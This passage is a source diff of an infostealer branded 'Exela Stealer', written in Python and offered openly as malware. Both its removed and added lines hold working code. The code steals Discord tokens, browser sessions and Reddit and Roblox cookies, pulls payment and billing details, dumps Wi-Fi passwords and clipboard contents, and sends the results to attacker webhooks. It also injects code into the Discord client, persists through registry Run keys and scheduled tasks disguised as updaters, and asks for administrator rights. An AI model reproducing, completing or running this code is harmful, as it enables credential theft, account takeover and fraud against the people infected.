-                                            if not dec_token in self.fullTokens:
-                                                self.fullTokens.append(dec_token)
-                                                self.validateDcTokenAndGetInfo(dec_token, name)
-                                            else:
-                                                continue                                      
-                else: # extract tokens from browsers
-                    if os.path.exists(path):
-                        for root, folders, files in os.walk(path):
-                            for folder in folders:
-                                folder_path = os.path.join(root, folder)
-                                if r"Local Storage\leveldb" in folder_path:
-                                    for xd in os.listdir(folder_path):
-                                        if xd[-3:] in ["log", "ldb"]:
-                                            new_path = os.path.join(folder_path, xd)
-                                            with open(new_path, "r", encoding="utf-8", errors="ignore") as files:
-                                                 for tokens in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", files.read()):
-                                                    if tokens:
-                                                        if not tokens in self.fullTokens:
-                                                            self.fullTokens.append(tokens)
-                                                            self.validateDcTokenAndGetInfo(tokens, name)
-                                                        else:
-                                                            continue                               
-        except Exception as e:
-            print(str(e))
-    def validateDcTokenAndGetInfo(self, value, browserorname):
-        try:
-            headers = {"Authorization" : value}
-            url = "https://discord.com/api/v8/users/@me"
-            url2 = "https://discord.com/api/v6/users/@me/billing/payment-sources"
-            req = requests.get(url, headers=headers)
-            req2 = requests.get(url2, headers=headers)
-            if not req.status_code == 200:
-                return  
-            else:
-                self.discrod = True
-                self.validatedTokens.append(value)
-                print("validtes")
-                for f in self.validatedTokens:
-                    id = req.json()["id"]
-                    dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req.json()['avatar']}"
-                    payment = req.json()['premium_type']
-                    nitro = ""
-                    if requests.get(dcpp + ".png").status_code == 200:
-                        dcpp += ".png"
-                    else:dcpp += ".gif"
-                    embed = dhooks.Embed(title="***Exela Stealer***", description=f"***Exela Discord Token Detected on {browserorname}***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
-                    embed.set_thumbnail(url=dcpp)
-                    embed.add_field(name="ID",inline=True, value=f"```{id}```")
-                    embed.add_field(name="Username",inline=True, value=f"```{req.json()['username']}```")
-                    embed.add_field(name="Email",inline=True, value=f"```{req.json()['email']}```")
-                    if req.json()["phone"] != None:
-                        embed.add_field(name="Phone",inline=True, value=f"```{req.json()['phone']}```")
-                    embed.add_field(name="IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
-                    if payment == 0:nitro="No Nitro"
-                    elif payment == 1:nitro="Nitro Classic"
-                    elif payment == 2:nitro="Normal Classic"
-                    elif payment == 3:nitro="Nitro Basic"
-                    else:nitro="Unkown"
-                    embed.add_field(name="Nitro Billing", value=f"```{nitro}```")
-                    if "billing_address" in req2.text:
-                        dataa = req2.json()[0]
-                        billgininfo = f"{dataa['billing_address']['line_1']}, {dataa['billing_address']['city']}, " + f"{dataa['billing_address']['country']}, " + f"{dataa['billing_address']['postal_code']}, "
-                        embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {dataa['brand']}, Last Four : {dataa['last_4']}, Expiration Date : {dataa['expires_month']}/{dataa['expires_year']}, Cart on name : {dataa['billing_address']['name']}, Adress : {billgininfo}```")
+                
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.post(Url, headers=headers, json=jsonData) as res:
+                    response =  await res.json()
+                    accessToken = response["access_token"]
+                    headers2 = {
+                                'User-Agent': 'android:com.example.myredditapp:v1.2.3',
+                                "Authorization": "Bearer " + accessToken}
+                    async with session.get(Url2, headers=headers2) as sex:
+                        data2 = await sex.json()
+                    if data2["email"] == "":
+                        gmail = "No email"
                     else:
-                        pass
-                    if req.json()['bio'] != "":
-                        embed.add_field(name="biography",inline=False, value=f"```{req.json()['bio']}```")
-                    embed.add_field(name=f"Token",inline=False, value=f"```{f}```")
-                    embed.set_footer(text="https://t.me/ExelaStealer")
-                    self.hook.send(embed=embed)
-                    self.discordd.append(f"Discord ID : {id}\nUsername : {req.json()['username']}\nEmail : {req.json()['email']}\nis mfa Enabled : {req.json()['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
-        except Exception as e:
-            print(e)
-    def metlFile(self):
-        pathxd = os.getenv("localappdata") + r"\ExelaUpdateService"
-        fullPath = os.path.abspath(sys.argv[0])
-        if os.path.isdir(pathxd):
-            return
-        else:
-            try:
-                os.mkdir(pathxd)
-                shutil.copyfile(fullPath, pathxd + r"\Exela.exe")
-                path = pathxd + "\\Exela.exe"
-                subprocess.run(f'attrib +h +s "{pathxd}"', shell=True) # Give system priv and hidden the directory
-                subprocess.run(f'attrib +h +s "{path}"', shell=True) # Give system priv and hidden the file
-            except Exception as e:
-                print(str(e))
-    def getPriv(self):
-        try:
-            code = ctypes.windll.shell32.IsUserAnAdmin()
-            return code
+                        gmail = data2["email"]
+                    
+                    pp = data2["icon_img"]
+                    username = data2["name"]
+                    profileUrl = 'https://www.reddit.com/user/' + username
+                    commentKarma = data2["comment_karma"]
+                    totalKarma = data2["total_karma"]
+                    coins = data2["coins"]
+                    mod = data2["is_mod"]
+                    gold = data2["is_gold"]
+                    suspended = data2["is_suspended"]
+                    
+            embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Reddit Session was detected on the {browser} browser***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": pp}}
+            fields = [
+                {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
+                {"name": "Email", "value": "``" + str(gmail) + "``", "inline": True},
+                {"name": "Comment Karma", "value": "``" +  str(commentKarma) + "``", "inline": True},
+                {"name": "Total Karma", "value": "``" + str(totalKarma) + "``", "inline": True},
+                {"name": "Coins", "value":"``" + str(coins) + "``", "inline": True},
+                {"name": "Is Mod", "value": "``" + str(mod) + "``", "inline": True},
+                {"name": "Is Gold", "value": "``" + str(gold) + "``", "inline": True},
+                {"name": "Suspended", "value": "``" + str(suspended) + "``", "inline": True},
+                {"name": "Profile URL", "value": "``" + str(profileUrl) + "``", "inline": False},
+                {"name": "Cookie", "value": "``" + str(cookie) + "``", "inline": False},
+                ]
+            embed_data["fields"] = fields
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers) as response:
+                    pass
         except:
-            return 0 
-    def copyToStartup(self):
-        self.metlFile()
-        output = self.getPriv()
-        if startup_xd == "regedit":
-            if output == 0: # copy to hkcu
-                code = f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AutoUpdateChecker" /t REG_SZ /d "{os.path.join(self.local_app_data, "ExelaUpdateService", "Exela.exe")}" /f'
-                subprocess.run(code, shell=True)
+            pass
+        else:
+            self.redditSessionList.append(f"Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma : {commentKarma}\nTotal Karma : {totalKarma}\nis Mod : {mod}\nis Gold : {gold}\nSuspended : {suspended}\n======================================================================\n")
+    async def RobloxSession(self, cookie, browser:str) -> None:
+        try:
+            headers = {'cookie':f'.ROBLOSECURITY={cookie}',"Accept-Encoding": "identity"}
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get("https://www.roblox.com/my/account/json",headers=headers) as response:
+                    res = await response.json()
+                async with session.get(f"https://economy.roblox.com/v1/users/{str(res['UserId'])}/currency",headers=headers) as req:
+                    res2 = await req.json()
+                async with session.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={str(res['UserId'])}&size=420x420&format=Png&isCircular=false",headers=headers) as req2:
+                    res3 = await req2.json()
+                id = res["UserId"]
+                name = res["Name"]
+                DisplayName = res["DisplayName"]
+                email = res["UserEmail"]
+                isEmailVerified = res["IsEmailVerified"]
+                robux = res2["robux"]
+                pp = res3["data"][0]["imageUrl"]
+                embed_data = {
+                    "title": "***Exela Stealer***",
+                    "description": f"***Exela Roblox Session was detected on the {browser} browser***",
+                    "url" : "https://t.me/ExelaStealer",
+                    "color": 0,
+                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                    "thumbnail": {"url": pp}}
+                fields = [
+                    {"name": "Name", "value": "``" + str(name) + "``", "inline": True},
+                    {"name": "Display Name", "value": "``" + str(DisplayName) + "``", "inline": True},
+                    {"name": "Email", "value": "``" +  str(email) + "``", "inline": True},
+                    {"name": "ID", "value": "``" + str(id) + "``", "inline": True},
+                    {"name": "Email Verified?", "value": "``" + str(isEmailVerified) + "``", "inline": True},
+                    {"name": "robux", "value": "``" + str(robux) + "``", "inline": True},
+                    {"name": "Cookie", "value": "```" + str(cookie) + "```", "inline": True},]
+                embed_data["fields"] = fields
+                payload = {
+                    "username": "Exela Stealer",
+                    "embeds": [embed_data]
+                }
+                headers2 = {
+                    "Content-Type": "application/json"
+                }
+                async with session.post(webhook, json=payload, headers=headers2) as response:
+                    pass
+        except:
+            pass
+        else:
+            self.robloxSessionCount += 1
+            self.robloxSessionList.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
+    async def GetTokens(self) -> None:
+        try:
+            discord_dirs = {
+                "Discord" : os.path.join(self.RoamingAppData, "discord", "Local Storage", "leveldb"),
+                "Discord Canary" : os.path.join(self.RoamingAppData, "discordcanary", "Local Storage", "leveldb"),
+                "Lightcord" : os.path.join(self.RoamingAppData, "Lightcord", "Local Storage", "leveldb"),
+                "Discord PTB" : os.path.join(self.RoamingAppData, "discordptb", "Local Storage", "leveldb"),
+            }
+            dirs = list()
+            for r, discord_dir in discord_dirs.items():
+                if os.path.isdir(discord_dir):
+                    dirs.append(discord_dir)
+            for x in self.profiles_full_path:
+                if not x.endswith("leveldb"):
+                    new_path = os.path.join(x, "Local Storage","leveldb")
+                    if os.path.isdir(new_path):
+                        dirs.append(new_path)
+            for directorys in dirs:
+                if "cord" in directorys:  # extract tokens from discord 
+                    key = SubModules.GetKey(directorys.replace(r"Local Storage\leveldb", "Local State"))
+                    for y in os.listdir(directorys):
+                        full_path = os.path.join(directorys, y)
+                        if full_path[-3:] in ["log", "ldb"]:
+                            with open(full_path, "r", encoding="utf-8", errors="ignore") as files:
+                                for tokens in re.findall(r"dQw4w9WgXcQ:[^\"]*", files.read()):
+                                    if tokens:
+                                        enc_token = base64.b64decode(tokens.split("dQw4w9WgXcQ:")[1])
+                                        dec_token = SubModules.Decrpytion(enc_token, key)
+                                        if not dec_token in self.full_tokens:
+                                            self.full_tokens.append(dec_token)
+                                            await self.ValidateTokenAndGetInfo(dec_token)
+                                        else:
+                                            continue                                      
+                else: # extract tokens from browsers
+                    for x in os.listdir(directorys):
+                        file_name = os.path.join(directorys, x)
+                        if file_name[-3:] in ["log", "ldb"]:
+                            with open(file_name, "r" ,encoding="utf-8", errors="ignore") as file:
+                                for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", file.read()):
+                                    if token:
+                                        if not token in self.full_tokens:
+                                            self.full_tokens.append(token)
+                                            await self.ValidateTokenAndGetInfo(token)
+                                        else:
+                                            continue
+        except:
+            pass
+    def calc_flags(self, flags: int) -> list:
+        flags_dict = {
+                "DISCORD_EMPLOYEE": {
+                    "emoji": "<:staff:968704541946167357>",
+                    "shift": 0,
+                    "ind": 1
+                },
+                "DISCORD_PARTNER": {
+                    "emoji": "<:partner:968704542021652560>",
+                    "shift": 1,
+                    "ind": 2
+                },
+                "HYPESQUAD_EVENTS": {
+                    "emoji": "<:hypersquad_events:968704541774192693>",
+                    "shift": 2,
+                    "ind": 4
+                },
+                "BUG_HUNTER_LEVEL_1": {
+                    "emoji": "<:bug_hunter_1:968704541677723648>",
+                    "shift": 3,
+                    "ind": 4
+                },
+                "HOUSE_BRAVERY": {
+                    "emoji": "<:hypersquad_1:968704541501571133>",
+                    "shift": 6,
+                    "ind": 64
+                },
+                "HOUSE_BRILLIANCE": {
+                    "emoji": "<:hypersquad_2:968704541883261018>",
+                    "shift": 7,
+                    "ind": 128
+                },
+                "HOUSE_BALANCE": {
+                    "emoji": "<:hypersquad_3:968704541874860082>",
+                    "shift": 8,
+                    "ind": 256
+                },
+                "EARLY_SUPPORTER": {
+                    "emoji": "<:early_supporter:968704542126510090>",
+                    "shift": 9,
+                    "ind": 512
+                },
+                "BUG_HUNTER_LEVEL_2": {
+                    "emoji": "<:bug_hunter_2:968704541774217246>",
+                    "shift": 14,
+                    "ind": 16384
+                },
+                "VERIFIED_BOT_DEVELOPER": {
+                    "emoji": "<:verified_dev:968704541702905886>",
+                    "shift": 17,
+                    "ind": 131072
+                },
+                "ACTIVE_DEVELOPER": {
+                    "emoji": "<:Active_Dev:1045024909690163210>",
+                    "shift": 22,
+                    "ind": 4194304
+                },
+                "CERTIFIED_MODERATOR": {
+                    "emoji": "<:certified_moderator:988996447938674699>",
+                    "shift": 18,
+                    "ind": 262144
+                },
+                "SPAMMER": {
+                    "emoji": "⌨",
+                    "shift": 20,
+                    "ind": 1048704
+                },
+            }
+
+        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+    def calc_flags2(self, flags : int) -> list:
+        flags_dict = {
+                "DISCORD_EMPLOYEE": {
+                    "emoji": "<:staff:968704541946167357>",
+                    "shift": 0,
+                    "ind": 1
+                },
+                "DISCORD_PARTNER": {
+                    "emoji": "<:partner:968704542021652560>",
+                    "shift": 1,
+                    "ind": 2
+                },
+                "BUG_HUNTER_LEVEL_1": {
+                    "emoji": "<:bug_hunter_1:968704541677723648>",
+                    "shift": 3,
+                    "ind": 4
+                },
+                "EARLY_SUPPORTER": {
+                    "emoji": "<:early_supporter:968704542126510090>",
+                    "shift": 9,
+                    "ind": 512
+                },
+                "VERIFIED_BOT_DEVELOPER": {
+                    "emoji": "<:verified_dev:968704541702905886>",
+                    "shift": 17,
+                    "ind": 131072
+                },
+                "ACTIVE_DEVELOPER": {
+                    "emoji": "<:active_dev:1045024909690163210>",
+                    "shift": 22,
+                    "ind": 4194304
+                },
+                "CERTIFIED_MODERATOR": {
+                    "emoji": "<:certified_moderator:988996447938674699>",
+                    "shift": 18,
+                    "ind": 262144
+                },
+                "SPAMMER": {
+                    "emoji": "⌨",
+                    "shift": 20,
+                    "ind": 1048704
+                },
+            }
+
+        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
+    async def ValidateTokenAndGetInfo(self, token:str) -> None:
+        try:
+            headers = {
+                'Authorization' : token
+            }
+            acc_info = 'https://discord.com/api/v8/users/@me'
+            gift_codes = 'https://discord.com/api/v9/users/@me/outbound-promotions/codes'
+            hq_friends_url = 'https://discord.com/api/v8/users/@me/relationships'
+            guilds_url = 'https://discord.com/api/v9/users/@me/guilds?with_counts=true'
+            pp = None
+            async with aiohttp.ClientSession() as session:
+                async with session.get(acc_info, headers=headers) as response:
+                    if response.status == 200:
+                        self.validated_tokens.append(token)
+                        data = await response.json()
+                        avatar = data["avatar"]
+                        badges = ' '.join([flag[0] for flag in self.calc_flags(data['public_flags'])])
+                        avatar_url = f"https://cdn.discordapp.com/avatars/{data['id']}/{avatar}"
+                        if avatar:
+                            async with session.get(f"{avatar_url}.png", headers=headers) as av:
+                                if av.status == 200:
+                                    pp= avatar_url +".png"
+                                else:pp += avatar_url + ".gif"
+                        async with session.get(hq_friends_url, headers=headers) as response2:
+                            req = await response2.json()
+                        async with session.get(guilds_url, headers=headers) as response4:
+                            guilds = await response4.json()
+                        async with session.get(gift_codes, headers=headers) as response3:
+                            data2 = await response3.json()
+                    else:return
+            
+            if req:
+                hq_friends = []
+                for friend in req:
+                    unprefered_flags = [64, 128, 256, 1048704]
+                    inds = [flag[1] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]]
+                    for flag in unprefered_flags:
+                        inds.remove(flag) if flag in inds else None
+                    if inds != []:
+                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags2(friend['user']['public_flags'])[::-1]])
+                        hq_data = f"{hq_badges} - ``{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})``"
+                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
+                            break   
+                        hq_friends.append(hq_data)
+                if len(hq_friends) > 0:
+                    hq_friends = '\n'.join(hq_friends)
+                                
+            if guilds:
+                hq_guilds = []
+                for guild in guilds:
+                    admin = True if guild['permissions'] == '4398046511103' else False
+                    owner = True if guild['owner'] else False
+                    owner_ico = "✅" if guild['owner'] else "❌"
+                    if owner or admin:
+                        async with aiohttp.ClientSession() as invite_session:
+                            async with invite_session.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}) as inv:
+                                invites = await inv.json()
+                        if len(invites) > 0:
+                            invite = f"https://discord.gg/{invites[0]['code']}"
+                        else:
+                            invite = "https://t.me/ExelaStealer"
+                        hq_guild_data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner_ico}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
+                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
+                            break
+
+                        hq_guilds.append(hq_guild_data)
+            nitroType = "No Nitro"
+            premium_type = data["premium_type"]
+            if premium_type == 0:
+                nitroType='None'
+            elif premium_type['premium_type'] == 1:
+                nitroType = 'Nitro Classic'
+            elif premium_type['premium_type'] == 2:
+                nitroType = 'Nitro'
+            elif premium_type['premium_type'] == 3:
+                nitroType = 'Nitro Basic'
             else:
-                code = f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "AutoUpdateChecker" /t REG_SZ /d "{os.path.join(self.local_app_data, "ExelaUpdateService", "Exela.exe")}" /f'
-                subprocess.run(code, shell=True)
-        elif startup_xd == "schtasks":
-            result = subprocess.run(
-                'schtasks /query /TN "AutoUpdateCheckerHourly"',
-                shell=True,
-                stdout=subprocess.PIPE,  
-                stderr=subprocess.PIPE )
-            if not result.returncode == 0: # if not file already on startup
-                if output: # if the code running with admin privilage
-                    onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "AutoUpdateCheckerOnLogon" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
-                    everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "AutoUpdateCheckerHourly" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
-                    subprocess.run(onLogonCommand, shell=True)
-                    subprocess.run(everyOneHour,shell=True)
-                else: # if the code not run with admin priv, get admin priv
-                    result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
-                        os._exit(0)
-                    else: # if not give admin code
-                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /tn "AutoUpdateCheckerHourly" /tr "{os.path.join(os.getenv("localappdata"), "ExelaUpdateService", "Exela.exe")}"'
-                        subprocess.run(everyOneHour, shell=True)
-    def sendxd(self):
-        global hooksxd
-        command = "wmic csproduct get uuid"
-        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
-        shutil.make_archive(os.getenv('temp') + f"\\{run}", "zip", os.getenv('temp') + f"\\{run}")
-        hooksxdd = dhooks.Webhook(UrLxD,username="i fucked her (quicaxd <3)")
-        filee = dhooks.File(os.getenv('temp') + f"\\{run}.zip")
-        embed = dhooks.Embed(title="***Exela Stealer***", description="***Exela Stealer***", color=0x070707, url="https://t.me/ExelaStealer", timestamp = "now")
-        embed.set_thumbnail(url="https://i.hizliresim.com/8po0puy.jfif")
-        embed.add_field(name="Found Instagram Session's",  inline=True,value=f"```{str(len(self.instagram_account_list)) if self.instagram_account_list else 'Nope'}```")
-        embed.add_field(name="Found Twitter Session's",  inline=True,value=f"```{str(len(self.twitter_account_list)) if self.twitter_account_list else 'Nope'}```")
-        embed.add_field(name="Found Tiktok Session's",  inline=True,value=f"```{str(len(self.tiktok_account_list)) if self.tiktok_account_list else 'Nope'}```")
-        embed.add_field(name="Found Reddit Session's",  inline=True,value=f"```{str(len(self.reddit_account_list)) if self.reddit_account_list else 'Nope'}```")
-        embed.add_field(name="Found Discord Token's",  inline=True,value=f"```{str(len(self.validatedTokens)) if self.validatedTokens else 'Nope'}```")
-        embed.add_field(name="Found Steam Session's",  inline=True,value=f"```{str(len(self.steam_account_list)) if self.steam_account_list else 'Nope'}```")
-        embed.add_field(name="Found Roblox Session's",  inline=True,value=f"```{str(len(self.roblox_account_list)) if self.roblox_account_list else 'Nope'}```")
-        embed.add_field(name="Total Password's",  inline=True,value=f"```{str(len(self.passwords_list))}```")
-        embed.add_field(name="Total Card's",  inline=True,value=f"```{str(len(self.card_list))}```")
-        embed.add_field(name="Total Cookies",  inline=True,value=f"```{str(len(self.cookie_list) + len(self.mozilla_cookie))}```")
-        embed.add_field(name="Total Download's",  inline=True,value=f"```{str(len(self.downloads_list))}```")
-        embed.add_field(name="Total History's",  inline=True,value=f"```{str(len(self.history_list) + len(self.mozilla_history))}```")
-        embed.add_field(name="Inject Keylogger?", inline=True, value=f"```{'Yes, Keylogger logs will come after every 300 keystrokes' if injectKeylogger else 'Nope'}```")
-        embed.add_field(name="Exela Stealer is the best", inline=False, value="```just sex and money xd```")
-        embed.set_footer(text="https://t.me/ExelaStealer")
-        hooksxdd.send(embed=embed, file=filee)
+                nitroType = 'None'
+            if data:
+                embed_data = {
+                "title": "***Exela Stealer***",
+                "description": f"***Exela Validated Discord Token Detected***",
+                "url" : "https://t.me/ExelaStealer",
+                "color": 0,
+                "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                "thumbnail": {"url": ""}}
+                if pp:
+                    embed_data["thumbnail"]["url"] = pp
+                bio = str(data['bio'])
+                bio = bio.replace("\n", ", ")
+                codes = []
+                if data:
+                    for code in data2:
+                        name = code['promotion']['outbound_title']
+                        code = code['code']
+                        data = f":gift: ``{name}``\n:ticket: ``{code}``"
+                        if len('\n\n'.join(codes)) + len(data) >= 1024:
+                            break
+
+                        codes.append(data)
+
+                    if len(codes) > 0:
+                        codes = '\n\n'.join(codes)
+
+                    else:
+                        codes = None
+
+                fields = [
+                {"name": "Token", "value": "``" + token + "``", "inline": False},
+                {"name": "Username", "value": "``" + str(f'{data["username"]}#{data["discriminator"]}') + "``", "inline": True},
+                {"name": "Email", "value": "``" + str(data['email']) + "``", "inline": True},
+                {"name": "ID", "value": "``" +  str(data["id"]) + "``", "inline": True},
+                {"name": "Phone", "value": "``" + str(data['phone']) + "``", "inline": True},
+                {"name": "MFA Enabled?", "value":"``" + str(data['mfa_enabled']) + "``", "inline": True},
+                {"name": "Nitro Type", "value": "``" + str(nitroType) + "``", "inline": True},
+                {"name": "Badges", "value": str(badges if badges != '' else 'None'), "inline": True},]
+                if codes:
+                    try:
+                        fields.append({"name": "Gift Codes", "value": str(codes), "inline": False},)
+                    except:
+                        pass
+                if hq_friends:
+                    try:
+                        fields.append({"name": "Hq Friends", "value":  hq_friends, "inline": False},)
+                    except:
+                        pass
+                if hq_guilds:
+                    try:
+                        hq_guilds = '\n'.join(hq_guilds)
+                        fields.append({"name": "Hq Guilds", "value":  hq_guilds, "inline": False},)
+                    except:
+                        pass
+                embed_data["fields"] = fields
+                async with aiohttp.ClientSession() as session:
+                    payload = {
+                        "username": "Exela Stealer",
+                        "embeds": [embed_data]
+                    }
+                    headers = {
+                        "Content-Type": "application/json"
+                    }
+                    async with session.post(webhook, json=payload, headers=headers) as response:
+                        pass
+                self.discordAccountList.append(f"Username : {data['username']}#{data['discriminator']}\nEmail : {data['email']}\nID : {data['id']}\nPhone : {str(data['phone'])}\nMFA Enabled : {data['mfa_enabled']}\nNitro Type : {nitroType}\nToken : {token}\nBiography : {bio}\nGift Codes : {str(codes)}\n======================================================================\n")
+
+        except Exception as e:
+            os.system("cls")
+            print(e)
+
+    async def DiscordInjection(self) -> None:
         try:
-            os.remove(os.getenv('temp') + f"\\{run}.zip")
-            shutil.rmtree(os.getenv('temp') + f"\\{run}")
-        except:pass
-    def get_active_window_title(self):
-        try:
-            user32 = ctypes.windll.user32
-            GetForegroundWindow = user32.GetForegroundWindow
-            GetWindowTextLength = user32.GetWindowTextLengthW
-            GetWindowText = user32.GetWindowTextW
-            hwnd = GetForegroundWindow()
-            length = GetWindowTextLength(hwnd) + 1
-            if length == 1:
-                return "No active window title"
-            
-            buffer = ctypes.create_unicode_buffer(length)  # Bellek tamponu oluşturulur
-            GetWindowText(hwnd, buffer, length)  # Başlık metni tampona alınır
-            
-            if buffer.value == "":
-                return "No active window title"
-            
-            return buffer.value
+            if discord_injection:
+                discord_dirs = {
+                        "Discord" : os.path.join(self.LocalAppData, "discord"),
+                        "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
+                        "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
+                        "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
+                    }
+                injection_code = await self.GetInjectionCode()
+                for f, _ in discord_dirs.items():
+                    if os.path.exists(_):
+                        indexPath:str = await self.FindIndexPath(_)
+                        if os.path.exists(indexPath):
+                            with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
+                                if not webhook in file.read():
+                                    await self.KillDiscord()
+                                    with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
+                                        x.write(injection_code.replace('https://discord.com/api/webhooks/1154107526711885875/NiRTvgpX6duR7elXN25mcCV4SfUaxDq1Jm9YNXpkK42LGi9KbLKKeTaPeCu4gzqoCwlE', webhook))
+                                    command = os.path.join(_, "Update.exe") + " --processStart Discord.exe"
+                                    result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
+                                    await result.communicate()
         except:
-            return "Null"
-    def get_last_clipboard_text(self, path):
+            pass
+    async def FindIndexPath(self, path:str) -> str:
         try:
-            pathsxd = os.getenv('temp') + "\\" + path
-            process = subprocess.run(["powershell.exe", "Get-Clipboard"], capture_output=True, text=True, shell=True)
-            output = process.stdout.strip()
-            if not output == "":
-                with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
-                    lst.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                    lst.write(output)
-        except Exception as e:
-            print(str(e))
-    def get_last_clipboard_image(self, path):
-        try:
-            pathsxd = os.getenv('temp') + "\\" + path + "\\last_clipboard_image.png"
-            powershell_command = f'''          
-            $clipboardData = Get-Clipboard -Format Image
-            $destinationPath = "{pathsxd}"
-            $clipboardData.Save($destinationPath)'''
-            subprocess.run(['powershell.exe', '-Command', powershell_command],capture_output=True, text=True, shell=True)
-        except Exception as e:
-            print(str(e))
-    def get_all_system_data(self):
-        command = "wmic csproduct get uuid"
-        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
-        process = subprocess.run(r"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Startup Info#### & wmic startup get caption,command & echo ####Firewallinfo#### & netsh firewall show state ", capture_output= True, shell= True)
-        output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
-        tmp = os.getenv('temp')
-        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as f:
-            f.write(f"Full System Information\n{output}")
-    def GetWifiPasswords(self, path:str):
-        pathxd = os.path.join(path, "Wifi.txt")
-        try:
-            wifi_list = list()
-            current_code_page = subprocess.check_output("chcp", shell=True).decode().split(":")[1].strip()
-            result = subprocess.check_output("netsh wlan show profiles", shell=True)
-            try:
-                result = result.decode(current_code_page)
-            except:result = result.decode(errors="ignore")
-            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', result)
-            for profile_name in wifi_profile_names:
-                result = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True, encoding=None)
-                try:
-                    password_match = re.search(r'Key content\s*: (.*)', result.decode(current_code_page), re.IGNORECASE)
-                except:password_match = re.search(r'Key content\s*: (.*)', result.decode(errors="ignore"), re.IGNORECASE)
-                wifi_list.append((profile_name, password_match.group(1) if password_match else "No password found"))
-            with open(pathxd,"a", encoding="utf-8", errors="ignore") as file:
-                file.write("----------------------https://t.me/ExelaStealer----------------------\n\n")
-                for name, passw in wifi_list:
-                    file.write(f"\nWifi Profile: {name}\nWifi Password: {passw}\n===========================================")
-        except Exception as asd:
-            print(str(asd))
-    def writeAllData(self):    
-        command = "wmic csproduct get uuid"
-        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
-        tmp = os.getenv('temp')
-        if not os.path.isdir(tmp + f"\\{run}"):
-            os.mkdir(tmp + f"\\{run}")
-        shutil.rmtree(tmp+f'\\{run}')
-        print("Deleted Temp Folder!, creating new folder") 
-        os.mkdir(tmp + f"\\{run}")
-        if self.passwords_list:
-            os.mkdir(tmp + f"\\{run}\\Passwords")
-            with open(tmp + f"\\{run}\\Passwords\\Passwords.txt", "a", encoding="utf-8", errors="ingore") as f:
-                f.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                for passwss in self.passwords_list:
-                    f.write(str(passwss) + "\n")
-        if self.card_list:
